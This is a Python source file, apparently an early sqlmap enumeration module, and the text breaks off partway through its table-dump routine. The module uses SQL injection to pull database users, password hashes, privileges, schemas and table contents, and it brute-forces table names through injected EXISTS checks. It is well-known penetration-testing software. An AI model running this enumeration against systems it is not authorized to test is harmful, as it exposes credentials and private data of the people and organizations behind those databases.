#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import dataToStdout
from lib.core.common import getRange
from lib.core.common import getCompiledRegex
from lib.core.common import getConsoleWidth
from lib.core.common import getFileItems
from lib.core.common import getUnicode
from lib.core.common import parsePasswordHash
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import readInput
from lib.core.common import safeStringFormat
from lib.core.convert import urlencode
from lib.core.convert import utf8decode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.data import queries
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.exception import sqlmapUserQuitException
from lib.core.session import setOs
from lib.core.settings import SQL_STATEMENTS
from lib.core.shell import autoCompletion
from lib.core.unescaper import unescaper
from lib.parse.banner import bannerParser
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.inband.union.test import unionTest
from lib.techniques.outband.stacked import stackedTest

class Enumeration:
    """
    This class defines generic enumeration functionalities for plugins.
    """

    def __init__(self, dbms):
        kb.data.has_information_schema = False
        kb.data.banner                 = ""
        kb.data.currentUser            = ""
        kb.data.currentDb              = ""
        kb.data.cachedUsers            = []
        kb.data.cachedUsersPasswords   = {}
        kb.data.cachedUsersPrivileges  = {}
        kb.data.cachedUsersRoles       = {}
        kb.data.cachedDbs              = []
        kb.data.cachedTables           = {}
        kb.data.cachedColumns          = {}
        kb.data.dumpedTable            = {}
        kb.misc.testedDbms             = dbms

    def getBanner(self):
        if not conf.getBanner:
            return

        kb.dbmsDetected = True

        infoMsg = "fetching banner"
        logger.info(infoMsg)

        if not kb.data.banner:
            if conf.unionUse or conf.unionTest:
                conf.dumper.technic("valid union", unionTest())

            query          = queries[kb.dbms].banner.query
            kb.data.banner = inject.getValue(query)
            bannerParser(kb.data.banner)

        if conf.os and conf.os == "windows":
            kb.bannerFp["type"] = set([ "Windows" ])

        elif conf.os and conf.os == "linux":
            kb.bannerFp["type"] = set([ "Linux" ])

        elif conf.os:
            kb.bannerFp["type"] = set([ "%s%s" % (conf.os[0].upper(), conf.os[1:]) ])

        setOs()

        return kb.data.banner

    def getCurrentUser(self):
        infoMsg = "fetching current user"
        logger.info(infoMsg)

        query = queries[kb.dbms].currentUser.query

        if not kb.data.currentUser:
            kb.data.currentUser = inject.getValue(query)

        return kb.data.currentUser

    def getCurrentDb(self):
        infoMsg = "fetching current database"
        logger.info(infoMsg)

        query = queries[kb.dbms].currentDb.query

        if not kb.data.currentDb:
            kb.data.currentDb = inject.getValue(query)

        return kb.data.currentDb

    def isDba(self):
        infoMsg = "testing if current user is DBA"
        logger.info(infoMsg)

        query = agent.forgeCaseStatement(queries[kb.dbms].is_dba.query)

        kb.data.isDba = inject.getValue(query, unpack=False, charsetType=1)

        return kb.data.isDba == "1"

    def getUsers(self):
        infoMsg = "fetching database users"
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].users

        condition  = ( kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ) )
        condition |= ( kb.dbms == "MySQL" and not kb.data.has_information_schema )

        if kb.unionPosition or conf.direct:
            if condition:
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query
            value = inject.getValue(query, blind=False)

            if value:
                kb.data.cachedUsers = value

        if not kb.data.cachedUsers and not conf.direct:
            infoMsg = "fetching number of database users"
            logger.info(infoMsg)

            if condition:
                query = rootQuery.blind.count2
            else:
                query = rootQuery.blind.count
            count = inject.getValue(query, inband=False, expected="int", charsetType=2)

            if not count.isdigit() or not len(count) or count == "0":
                errMsg = "unable to retrieve the number of database users"
                raise sqlmapNoneDataException, errMsg

            if kb.dbms == "Oracle":
                plusOne = True
            else:
                plusOne = False
            indexRange = getRange(count, plusOne=plusOne)

            for index in indexRange:
                if condition:
                    query = rootQuery.blind.query2 % index
                else:
                    query = rootQuery.blind.query % index
                user = inject.getValue(query, inband=False)

                if user:
                    kb.data.cachedUsers.append(user)

        if not kb.data.cachedUsers:
            errMsg = "unable to retrieve the database users"
            raise sqlmapNoneDataException, errMsg

        return kb.data.cachedUsers

    def getPasswordHashes(self):
        infoMsg = "fetching database users password hashes"

        rootQuery = queries[kb.dbms].passwords

        if conf.user == "CU":
            infoMsg += " for current user"
            conf.user = self.getCurrentUser()

        logger.info(infoMsg)

        if kb.unionPosition or conf.direct:
            if kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query

            condition = rootQuery.inband.condition

            if conf.user:
                if "," in conf.user:
                    users = conf.user.split(",")
                    query += " WHERE "
                    query += " OR ".join("%s = '%s'" % (condition, user) for user in users)
                else:
                    if kb.dbms == "MySQL":
                        parsedUser = re.search("[\047]*(.*?)[\047]*\@", conf.user)

                        if parsedUser:
                            conf.user = parsedUser.groups()[0]

                    query += " WHERE %s = '%s'" % (condition, conf.user)

            value = inject.getValue(query, blind=False)

            if value:
                for user, password in value:
                    if not user or user == " ":
                        continue

                    password = parsePasswordHash(password)

                    if not kb.data.cachedUsersPasswords.has_key(user):
                        kb.data.cachedUsersPasswords[user] = [password]
                    else:
                        kb.data.cachedUsersPasswords[user].append(password)

        if not kb.data.cachedUsersPasswords and not conf.direct:
            if conf.user:
                if "," in conf.user:
                    users = conf.user.split(",")
                else:
                    users = [conf.user]
            else:
                if not len(kb.data.cachedUsers):
                    users = self.getUsers()
                else:
                    users = kb.data.cachedUsers

            retrievedUsers = set()

            for user in users:
                if kb.dbms == "MySQL":
                    parsedUser = re.search("[\047]*(.*?)[\047]*\@", user)

                    if parsedUser:
                        user = parsedUser.groups()[0]

                if user in retrievedUsers:
                    continue

                infoMsg  = "fetching number of password hashes "
                infoMsg += "for user '%s'" % user
                logger.info(infoMsg)

                if kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                    query = rootQuery.blind.count2 % user
                else:
                    query = rootQuery.blind.count % user
                count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "unable to retrieve the number of password "
                    warnMsg += "hashes for user '%s'" % user
                    logger.warn(warnMsg)
                    continue

                infoMsg = "fetching password hashes for user '%s'" % user
                logger.info(infoMsg)

                passwords  = []

                if kb.dbms == "Oracle":
                    plusOne = True
                else:
                    plusOne = False
                indexRange = getRange(count, plusOne=plusOne)

                for index in indexRange:
                    if kb.dbms == "Microsoft SQL Server":
                        if kb.dbmsVersion[0] in ( "2005", "2008" ):
                            query = rootQuery.blind.query2 % (user, index, user)
                        else:
                            query = rootQuery.blind.query % (user, index, user)
                    else:
                        query = rootQuery.blind.query % (user, index)
                    password = inject.getValue(query, inband=False)
                    password = parsePasswordHash(password)
                    passwords.append(password)

                if passwords:
                    kb.data.cachedUsersPasswords[user] = passwords
                else:
                    warnMsg  = "unable to retrieve the password "
                    warnMsg += "hashes for user '%s'" % user
                    logger.warn(warnMsg)

                retrievedUsers.add(user)

        if not kb.data.cachedUsersPasswords:
            errMsg  = "unable to retrieve the password "
            errMsg += "hashes for the database users"
            raise sqlmapNoneDataException, errMsg

        return kb.data.cachedUsersPasswords

    def __isAdminFromPrivileges(self, privileges):
        # In PostgreSQL the usesuper privilege means that the
        # user is DBA
        dbaCondition  = ( kb.dbms == "PostgreSQL" and "super" in privileges )

        # In Oracle the DBA privilege means that the
        # user is DBA
        dbaCondition |= ( kb.dbms == "Oracle" and "DBA" in privileges )

        # In MySQL >= 5.0 the SUPER privilege means
        # that the user is DBA
        dbaCondition |= ( kb.dbms == "MySQL" and kb.data.has_information_schema and "SUPER" in privileges )

        # In MySQL < 5.0 the super_priv privilege means
        # that the user is DBA
        dbaCondition |= ( kb.dbms == "MySQL" and not kb.data.has_information_schema and "super_priv" in privileges )

        # In Firebird there is no specific privilege that means
        # that the user is DBA
        # TODO: confirm
        dbaCondition |= ( kb.dbms == "Firebird" and "SELECT" in privileges and "INSERT" in privileges and "UPDATE" in privileges and "DELETE" in privileges and "REFERENCES" in privileges and "EXECUTE" in privileges )

        return dbaCondition

    def getPrivileges(self, query2=False):
        infoMsg = "fetching database users privileges"

        rootQuery = queries[kb.dbms].privileges

        if conf.user == "CU":
            infoMsg += " for current user"
            conf.user = self.getCurrentUser()

        logger.info(infoMsg)

        # Set containing the list of DBMS administrators
        areAdmins = set()

        mysqlPrivs = (
                        ( 1, "select_priv" ),
                        ( 2, "insert_priv" ),
                        ( 3, "update_priv" ),
                        ( 4, "delete_priv" ),
                        ( 5, "create_priv" ),
                        ( 6, "drop_priv" ),
                        ( 7, "reload_priv" ),
                        ( 8, "shutdown_priv" ),
                        ( 9, "process_priv" ),
                        ( 10, "file_priv" ),
                        ( 11, "grant_priv" ),
                        ( 12, "references_priv" ),
                        ( 13, "index_priv" ),
                        ( 14, "alter_priv" ),
                        ( 15, "show_db_priv" ),
                        ( 16, "super_priv" ),
                        ( 17, "create_tmp_table_priv" ),
                        ( 18, "lock_tables_priv" ),
                        ( 19, "execute_priv" ),
                        ( 20, "repl_slave_priv" ),
                        ( 21, "repl_client_priv" ),
                        ( 22, "create_view_priv" ),
                        ( 23, "show_view_priv" ),
                        ( 24, "create_routine_priv" ),
                        ( 25, "alter_routine_priv" ),
                        ( 26, "create_user_priv" ),
                     )

        pgsqlPrivs = (
                        ( 1, "createdb" ),
                        ( 2, "super" ),
                        ( 3, "catupd" ),
                     )

        firebirdPrivs = {
                         "S": "SELECT",
                         "I": "INSERT",
                         "U": "UPDATE",
                         "D": "DELETE",
                         "R": "REFERENCES",
                         "E": "EXECUTE"
                     }

        if kb.unionPosition or conf.direct:
            if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                query     = rootQuery.inband.query2
                condition = rootQuery.inband.condition2
            elif kb.dbms == "Oracle" and query2:
                query     = rootQuery.inband.query2
                condition = rootQuery.inband.condition2
            else:
                query     = rootQuery.inband.query
                condition = rootQuery.inband.condition

            if conf.user:
                users = conf.user.split(",")
                query += " WHERE "
                # NOTE: I assume that the user provided is not in
                # MySQL >= 5.0 syntax 'user'@'host'
                if kb.dbms == "MySQL" and kb.data.has_information_schema:
                    queryUser = "%" + conf.user + "%"
                    query += " OR ".join("%s LIKE '%s'" % (condition, "%" + user + "%") for user in users)
                else:
                    query += " OR ".join("%s = '%s'" % (condition, user) for user in users)

            values = inject.getValue(query, blind=False)

            if not values and kb.dbms == "Oracle" and not query2:
                infoMsg = "trying with table USER_SYS_PRIVS"
                logger.info(infoMsg)

                return self.getPrivileges(query2=True)

            if values:
                for value in values:
                    user       = None
                    privileges = set()

                    for count in xrange(0, len(value)):
                        # The first column is always the username
                        if count == 0:
                            user = value[count]

                        # The other columns are the privileges
                        else:
                            privilege = value[count]

                            # In PostgreSQL we get 1 if the privilege is
                            # True, 0 otherwise
                            if kb.dbms == "PostgreSQL" and getUnicode(privilege).isdigit():
                                for position, pgsqlPriv in pgsqlPrivs:
                                    if count == position and int(privilege) == 1:
                                        privileges.add(pgsqlPriv)

                            # In MySQL >= 5.0 and Oracle we get the list
                            # of privileges as string
                            elif kb.dbms == "Oracle" or ( kb.dbms == "MySQL" and kb.data.has_information_schema ):
                                privileges.add(privilege)

                            # In MySQL < 5.0 we get Y if the privilege is 
                            # True, N otherwise
                            elif kb.dbms == "MySQL" and not kb.data.has_information_schema:
                                for position, mysqlPriv in mysqlPrivs:
                                    if count == position and privilege.upper() == "Y":
                                        privileges.add(mysqlPriv)

                    if self.__isAdminFromPrivileges(privileges):
                        areAdmins.add(user)

                    if kb.data.cachedUsersPrivileges.has_key(user):
                        kb.data.cachedUsersPrivileges[user].extend(privileges)
                    else:
                        kb.data.cachedUsersPrivileges[user] = list(privileges)

        if not kb.data.cachedUsersPrivileges and not conf.direct:
            conditionChar = "="

            if conf.user:
                if kb.dbms == "MySQL" and kb.data.has_information_schema:
                    conditionChar = " LIKE "

                    if "," in conf.user:
                        users = set()
                        for user in conf.user.split(","):
                            users.add("%" + user + "%")
                    else:
                        parsedUser = re.search("[\047]*(.*?)[\047]*\@", conf.user)

                        if parsedUser:
                            conf.user = parsedUser.groups()[0]

                        users = [ "%" + conf.user + "%" ]
                else:
                    users = conf.user.split(",")
            else:
                if not len(kb.data.cachedUsers):
                    users = self.getUsers()
                else:
                    users = kb.data.cachedUsers

            retrievedUsers = set()

            for user in users:
                unescapedUser = None

                if kb.dbms == "MySQL" and kb.data.has_information_schema:
                    unescapedUser = unescaper.unescape(user, quote=False)

                if user in retrievedUsers:
                    continue

                infoMsg  = "fetching number of privileges "
                infoMsg += "for user '%s'" % user
                logger.info(infoMsg)

                if unescapedUser:
                    queryUser = unescapedUser
                else:
                    queryUser = user

                if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                    query = rootQuery.blind.count2 % queryUser
                elif kb.dbms == "MySQL" and kb.data.has_information_schema:
                    query = rootQuery.blind.count % (conditionChar, queryUser)
                elif kb.dbms == "Oracle" and query2:
                    query = rootQuery.blind.count2 % queryUser
                else:
                    query = rootQuery.blind.count % queryUser
                count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    if not count.isdigit() and kb.dbms == "Oracle" and not query2:
                        infoMsg = "trying with table USER_SYS_PRIVS"
                        logger.info(infoMsg)

                        return self.getPrivileges(query2=True)

                    warnMsg  = "unable to retrieve the number of "
                    warnMsg += "privileges for user '%s'" % user
                    logger.warn(warnMsg)
                    continue

                infoMsg = "fetching privileges for user '%s'" % user
                logger.info(infoMsg)

                privileges = set()

                if kb.dbms == "Oracle":
                    plusOne = True
                else:
                    plusOne = False
                indexRange = getRange(count, plusOne=plusOne)

                for index in indexRange:
                    if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                        query = rootQuery.blind.query2 % (queryUser, index)
                    elif kb.dbms == "MySQL" and kb.data.has_information_schema:
                        query = rootQuery.blind.query % (conditionChar, queryUser, index)
                    elif kb.dbms == "Oracle" and query2:
                        query = rootQuery.blind.query2 % (queryUser, index)
                    elif kb.dbms == "Firebird":
                        query = rootQuery.blind.query % (index, queryUser)
                    else:
                        query = rootQuery.blind.query % (queryUser, index)
                    privilege = inject.getValue(query, inband=False)

                    # In PostgreSQL we get 1 if the privilege is True,
                    # 0 otherwise
                    if kb.dbms == "PostgreSQL" and ", " in privilege:
                        privilege = privilege.replace(", ", ",")
                        privs = privilege.split(",")
                        i = 1

                        for priv in privs:
                            if priv.isdigit() and int(priv) == 1:
                                for position, pgsqlPriv in pgsqlPrivs:
                                    if position == i:
                                        privileges.add(pgsqlPriv)

                            i += 1

                    # In MySQL >= 5.0 and Oracle we get the list
                    # of privileges as string
                    elif kb.dbms == "Oracle" or ( kb.dbms == "MySQL" and kb.data.has_information_schema ):
                        privileges.add(privilege)

                    # In MySQL < 5.0 we get Y if the privilege is 
                    # True, N otherwise
                    elif kb.dbms == "MySQL" and not kb.data.has_information_schema:
                        privilege = privilege.replace(", ", ",")
                        privs = privilege.split(",")
                        i = 1

                        for priv in privs:
                            if priv.upper() == "Y":
                                for position, mysqlPriv in mysqlPrivs:
                                    if position == i:
                                        privileges.add(mysqlPriv)

                            i += 1

                    # In Firebird we get one letter for each privilege
                    elif kb.dbms == "Firebird":
                        privileges.add(firebirdPrivs[privilege.strip()])

                    if self.__isAdminFromPrivileges(privileges):
                        areAdmins.add(user)

                    # In MySQL < 5.0 we break the cycle after the first
                    # time we get the user's privileges otherwise we
                    # duplicate the same query
                    if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                        break

                if privileges:
                    kb.data.cachedUsersPrivileges[user] = list(privileges)
                else:
                    warnMsg  = "unable to retrieve the privileges "
                    warnMsg += "for user '%s'" % user
                    logger.warn(warnMsg)

                retrievedUsers.add(user)

        if not kb.data.cachedUsersPrivileges:
            errMsg  = "unable to retrieve the privileges "
            errMsg += "for the database users"
            raise sqlmapNoneDataException, errMsg

        return ( kb.data.cachedUsersPrivileges, areAdmins )

    def getRoles(self, query2=False):
        warnMsg  = "on %s the concept of roles does not " % kb.dbms
        warnMsg += "exist. sqlmap will enumerate privileges instead"
        logger.warn(warnMsg)

        return self.getPrivileges(query2)

    def getDbs(self):
        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            warnMsg  = "information_schema not available, "
            warnMsg += "back-end DBMS is MySQL < 5. database "
            warnMsg += "names will be fetched from 'mysql' database"
            logger.warn(warnMsg)

        infoMsg = "fetching database names"
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].dbs

        if kb.unionPosition or conf.direct:
            if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                query = rootQuery.inband.query2
            else:
                query = rootQuery.inband.query
            value = inject.getValue(query, blind=False)

            if value:
                kb.data.cachedDbs = value

        if not kb.data.cachedDbs and not conf.direct:
            infoMsg = "fetching number of databases"
            logger.info(infoMsg)

            if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                query = rootQuery.blind.count2
            else:
                query = rootQuery.blind.count
            count = inject.getValue(query, inband=False, expected="int", charsetType=2)

            if not count.isdigit() or not len(count) or count == "0":
                errMsg = "unable to retrieve the number of databases"
                raise sqlmapNoneDataException, errMsg

            indexRange = getRange(count)

            for index in indexRange:
                if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                    query = rootQuery.blind.query2 % index
                else:
                    query = rootQuery.blind.query % index
                db = inject.getValue(query, inband=False)

                if db:
                    kb.data.cachedDbs.append(db)

        if not kb.data.cachedDbs:
            errMsg = "unable to retrieve the database names"
            raise sqlmapNoneDataException, errMsg

        return kb.data.cachedDbs

    def getTables(self):
        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            logger.error(errMsg)
            
            message = "do you want to use common table existance check? [Y/n/q]"
            test = readInput(message, default="Y")

            if test[0] in ("n", "N"):
                return
            elif test[0] in ("q", "Q"):
                raise sqlmapUserQuitException
            else:    
                return self.tableExists(paths.COMMON_TABLES)

        self.forceDbmsEnum()

        infoMsg = "fetching tables"
        if conf.db:
            infoMsg += " for database '%s'" % conf.db
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].tables

        if kb.unionPosition or conf.direct:
            query = rootQuery.inband.query
            condition = rootQuery.inband.condition

            if conf.db and kb.dbms != "SQLite":
                if "," in conf.db:
                    dbs = conf.db.split(",")
                    query += " WHERE "
                    query += " OR ".join("%s = '%s'" % (condition, db) for db in dbs)
                else:
                    query += " WHERE %s='%s'" % (condition, conf.db)
            elif conf.excludeSysDbs:
                query += " WHERE "
                query += " AND ".join("%s != '%s'" % (condition, db) for db in self.excludeDbsList)
                infoMsg = "skipping system databases '%s'" % ", ".join(db for db in self.excludeDbsList)
                logger.info(infoMsg)

            value = inject.getValue(query, blind=False)

            if value:
                if kb.dbms == "SQLite":
                    if isinstance(value, basestring):
                        value = [[ "SQLite", value ]]
                    elif isinstance(value, (list, tuple, set)):
                        newValue = []

                        for v in value:
                            newValue.append([ "SQLite", v])

                        value = newValue

                for db, table in value:
                    if not kb.data.cachedTables.has_key(db):
                        kb.data.cachedTables[db] = [table]
                    else:
                        kb.data.cachedTables[db].append(table)

        if not kb.data.cachedTables and not conf.direct:
            if conf.db:
                if "," in conf.db:
                    dbs = conf.db.split(",")
                else:
                    dbs = [conf.db]
            else:
                if not len(kb.data.cachedDbs):
                    dbs = self.getDbs()
                else:
                    dbs = kb.data.cachedDbs

            for db in dbs:
                if conf.excludeSysDbs and db in self.excludeDbsList:
                    infoMsg = "skipping system database '%s'" % db
                    logger.info(infoMsg)

                    continue

                infoMsg  = "fetching number of tables for "
                infoMsg += "database '%s'" % db
                logger.info(infoMsg)

                if kb.dbms in ("SQLite", "Firebird"):
                    query = rootQuery.blind.count
                else:
                    query = rootQuery.blind.count % db
                count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "unable to retrieve the number of "
                    warnMsg += "tables for database '%s'" % db
                    logger.warn(warnMsg)
                    continue

                tables = []

                if kb.dbms in ( "Microsoft SQL Server", "Oracle" ):
                    plusOne = True
                else:
                    plusOne = False
                indexRange = getRange(count, plusOne=plusOne)

                for index in indexRange:
                    if kb.dbms in ("SQLite", "Firebird"):
                        query = rootQuery.blind.query % index
                    else:
                        query = rootQuery.blind.query % (db, index)
                    table = inject.getValue(query, inband=False)
                    tables.append(table)
                    kb.hintValue = table

                if tables:
                    kb.data.cachedTables[db] = tables
                else:
                    warnMsg  = "unable to retrieve the tables "
                    warnMsg += "for database '%s'" % db
                    logger.warn(warnMsg)

        if not kb.data.cachedTables:
            errMsg = "unable to retrieve the tables for any database"
            raise sqlmapNoneDataException, errMsg

        return kb.data.cachedTables

    def tableExists(self, tableFile):
        tables = getFileItems(tableFile)
        retVal = []
        infoMsg = "checking tables existence using items from '%s'" % tableFile
        logger.info(infoMsg)

        pushValue(conf.verbose)
        conf.verbose = 0
        count = 0
        length = len(tables)

        for table in tables:
            query = agent.prefixQuery(" %s" % safeStringFormat("AND EXISTS(SELECT 1 FROM %s)", table))
            query = agent.postfixQuery(query)
            result = Request.queryPage(urlencode(agent.payload(newValue=query)))

            if result:
                infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), table)
                infoMsg = "%s%s\n" % (infoMsg, " "*(getConsoleWidth()-1-len(infoMsg)))
                dataToStdout(infoMsg, True)
                retVal.append(table)

            count += 1
            status = '%d/%d items (%d%s)' % (count, length, round(100.0*count/length), '%')
            dataToStdout("\r[%s] [INFO] tried: %s" % (time.strftime("%X"), status), True)

        conf.verbose = popValue()

        dataToStdout("\n", True)

        if not retVal:
            warnMsg = "no table found"
            logger.warn(warnMsg)

        return retVal

    def getColumns(self, onlyColNames=False):
        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        if not conf.tbl:
            errMsg = "missing table parameter"
            raise sqlmapMissingMandatoryOptionException, errMsg

        if "." in conf.tbl:
            conf.db, conf.tbl = conf.tbl.split(".")

        self.forceDbmsEnum()

        if not conf.db:
            warnMsg  = "missing database parameter, sqlmap is going to "
            warnMsg += "use the current database to enumerate table "
            warnMsg += "'%s' columns" % conf.tbl
            logger.warn(warnMsg)

            conf.db = self.getCurrentDb()
        
        firebirdTypes = {
                            "261":"BLOB",
                            "14":"CHAR",
                            "40":"CSTRING",
                            "11":"D_FLOAT",
                            "27":"DOUBLE",
                            "10":"FLOAT",
                            "16":"INT64",
                            "8":"INTEGER",
                            "9":"QUAD",
                            "7":"SMALLINT",
                            "12":"DATE",
                            "13":"TIME",
                            "35":"TIMESTAMP",
                            "37":"VARCHAR"
                        }

        rootQuery = queries[kb.dbms].columns
        condition = rootQuery.blind.condition

        infoMsg = "fetching columns "

        if conf.col:
            if kb.dbms == "Oracle":
                conf.col = conf.col.upper()
            colList = conf.col.split(",")
            condQuery = " AND (" + " OR ".join("%s LIKE '%s'" % (condition, "%" + col + "%") for col in colList) + ")"
            infoMsg += "like '%s' " % ", ".join(col for col in colList)
        else:
            condQuery = ""

        infoMsg += "for table '%s' " % conf.tbl
        infoMsg += "on database '%s'" % conf.db
        logger.info(infoMsg)

        if kb.unionPosition or conf.direct:
            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                query = rootQuery.inband.query % (conf.tbl, conf.db)
                query += condQuery
            elif kb.dbms == "Oracle":
                query = rootQuery.inband.query % conf.tbl.upper()
                query += condQuery
            elif kb.dbms == "Microsoft SQL Server":
                query = rootQuery.inband.query % (conf.db, conf.db,
                                                        conf.db, conf.db,
                                                        conf.db, conf.db,
                                                        conf.db, conf.tbl)
                query += condQuery.replace("[DB]", conf.db)
            elif kb.dbms == "SQLite":
                query = rootQuery.inband.query % conf.tbl

            value = inject.getValue(query, blind=False)

            if value:
                table = {}
                columns = {}

                if kb.dbms == "SQLite":
                    for match in re.finditer(getCompiledRegex(r"(\w+) ([A-Z]+)[,\r\n]"), value):
                        columns[match.group(1)] = match.group(2)
                else:
                    for column, colType in value:
                        columns[column] = colType

                table[conf.tbl] = columns
                kb.data.cachedColumns[conf.db] = table

        if not kb.data.cachedColumns and not conf.direct:
            infoMsg  = "fetching number of columns "
            infoMsg += "for table '%s'" % conf.tbl
            infoMsg += " on database '%s'" % conf.db
            logger.info(infoMsg)

            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                query = rootQuery.blind.count % (conf.tbl, conf.db)
                query += condQuery
            elif kb.dbms == "Oracle":
                query = rootQuery.blind.count % conf.tbl.upper()
                query += condQuery
            elif kb.dbms == "Microsoft SQL Server":
                query = rootQuery.blind.count % (conf.db, conf.db, conf.tbl)
                query += condQuery.replace("[DB]", conf.db)
            elif kb.dbms == "Firebird":
                query = rootQuery.blind.count % (conf.tbl)
                query += condQuery

            count = inject.getValue(query, inband=False, expected="int", charsetType=2)

            if not count.isdigit() or not len(count) or count == "0":
                errMsg  = "unable to retrieve the number of columns "
                errMsg += "for table '%s' " % conf.tbl
                errMsg += "on database '%s'" % conf.db
                raise sqlmapNoneDataException, errMsg

            table   = {}
            columns = {}

            indexRange = getRange(count)

            for index in indexRange:
                if kb.dbms in ( "MySQL", "PostgreSQL" ):
                    query = rootQuery.blind.query % (conf.tbl, conf.db)
                    query += condQuery
                    field = None
                elif kb.dbms == "Oracle":
                    query = rootQuery.blind.query % (conf.tbl.upper())
                    query += condQuery
                    field = None
                elif kb.dbms == "Microsoft SQL Server":
                    query = rootQuery.blind.query % (conf.db, conf.db,
                                                           conf.db, conf.db,
                                                           conf.db, conf.db,
                                                           conf.tbl)
                    query += condQuery.replace("[DB]", conf.db)
                    field = condition.replace("[DB]", conf.db)
                elif kb.dbms == "Firebird":
                    query = rootQuery.blind.query % (conf.tbl)
                    query += condQuery
                    field = None

                query = agent.limitQuery(index, query, field)
                column = inject.getValue(query, inband=False)

                if not onlyColNames:
                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        query = rootQuery.blind.query2 % (conf.tbl, column, conf.db)
                    elif kb.dbms == "Oracle":
                        query = rootQuery.blind.query2 % (conf.tbl.upper(), column)
                    elif kb.dbms == "Microsoft SQL Server":
                        query = rootQuery.blind.query2 % (conf.db, conf.db, conf.db,
                                                                conf.db, column, conf.db,
                                                                conf.db, conf.db, conf.tbl)
                    elif kb.dbms == "Firebird":
                        query = rootQuery.blind.query2 % (conf.tbl, column)

                    colType = inject.getValue(query, inband=False)

                    if kb.dbms == "Firebird":
                        colType = firebirdTypes[colType] if colType in firebirdTypes else colType

                    columns[column] = colType
                else:
                    columns[column] = None

            if columns:
                table[conf.tbl] = columns
                kb.data.cachedColumns[conf.db] = table

        if not kb.data.cachedColumns:
            errMsg  = "unable to retrieve the columns "
            errMsg += "for table '%s' " % conf.tbl
            errMsg += "on database '%s'" % conf.db
            raise sqlmapNoneDataException, errMsg

        return kb.data.cachedColumns

    def dumpTable(self):
        if not conf.tbl and not conf.col:
            errMsg = "missing table parameter"
            raise sqlmapMissingMandatoryOptionException, errMsg

        if conf.col and not conf.tbl:
            warnMsg = "missing table parameter. You only provided "
            warnMsg += "column(s). sqlmap will search for all databases' "
            warnMsg += "tables containing the provided column(s)"
            logger.warn(warnMsg)

            self.searchColumn()
            return

        if "." in conf.tbl:
            conf.db, conf.tbl = conf.tbl.split(".")

        self.forceDbmsEnum()

        if not conf.db:
            warnMsg  = "missing database parameter, sqlmap is going to "
            warnMsg += "use the current database to dump table "
            warnMsg += "'%s' entries" % conf.tbl
            logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        rootQuery = queries[kb.dbms].dump_table

        if conf.col:
            colList = conf.col.split(",")
            kb.data.cachedColumns[conf.db] = {}
            kb.data.cachedColumns[conf.db][conf.tbl] = {}

            for column in colList:
                kb.data.cachedColumns[conf.db][conf.tbl][column] = None

        elif not kb.data.cachedColumns:
            if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                errMsg  = "information_schema not available, "
                errMsg += "back-end DBMS is MySQL < 5.0"
                raise sqlmapUnsupportedFeatureException, errMsg

            kb.data.cachedColumns = self.getColumns(onlyColNames=True)

        colList = kb.data.cachedColumns[conf.db][conf.tbl].keys()
        colList.sort(key=lambda x: x.lower())
        colString = ", ".join(column for column in colList)

        infoMsg = "fetching"
        if conf.col:
            infoMsg += " columns '%s'" % colString
        infoMsg += " entries for table '%s'" % conf.tbl
        infoMsg += " on database '%s'" % conf.db
        logger.info(infoMsg)

        entriesCount = 0

        if kb.unionPosition or conf.direct:
            if kb.dbms == "Oracle":
                query = rootQuery.inband.query % (colString, conf.tbl.upper())
            elif kb.dbms == "SQLite":
                query = rootQuery.inband.query % (colString, conf.tbl)
            else:
                query = rootQuery.inband.query % (colString, conf.db, conf.tbl)
            entries = inject.getValue(query, blind=False, dump=True)

            if entries:
                if isinstance(entries, basestring):
                    entries = [ entries ]

                entriesCount = len(entries)
                index        = 0

                for column in colList:
                    colLen = len(column)

                    if not kb.data.dumpedTable.has_key(column):
                        kb.data.dumpedTable[column] = { "length": 0, "values": [] }

                    for entry in entries:
                        if entry is None or len(entry) == 0:
                            continue

                        if isinstance(entry, basestring):
                            colEntry = entry
                        else:
                            colEntry = entry[index] if index < len(entry) else u''

                        colEntryLen = len(getUnicode(colEntry))
                        maxLen = max(colLen, colEntryLen)

                        if maxLen > kb.data.dumpedTable[column]["length"]:
                            kb.data.dumpedTable[column]["length"] = maxLen

